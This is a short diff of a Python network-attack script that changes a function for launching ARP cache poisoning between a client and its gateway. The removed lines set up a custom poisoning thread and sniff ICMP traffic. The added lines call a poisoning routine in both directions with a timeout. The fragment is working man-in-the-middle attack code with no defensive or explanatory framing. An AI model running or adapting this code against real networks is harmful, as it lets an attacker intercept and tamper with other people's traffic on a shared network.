@@ -650,21 +650,11 @@ class ARPCachePoisonning(threading.Thread):
 """
 Launch an ARP poisonning attack
 """
-def launchARPpoisonning(clientIP, gatewayIP):
+def launchARPpoisonning(clientIP, gatewayIP, timeout):
 	global verbose, iface
 	
-	clientMAC = getmacbyip(clientIP)
-	gatewayMAC = getmacbyip(gatewayIP)
-	if clientMAC is None or gatewayMAC is None:
-		if verbose:
-			print "Cannot get MAC addr"
-		return None
-	
-	t = ARPCachePoisonning(clientMAC, clientIP, gatewayMAC, gatewayIP)
-	t.poison()
-	sniff(prn=viewPkt, filter="icmp", timeout=60, iface=iface)
-
-	t.ends()
+	arpcachepoison(clientIP, gatewayIP, timeout)
+	arpcachepoison(gatewayIP, clientIP, timeout)
 
 
 def viewPkt(pkt):
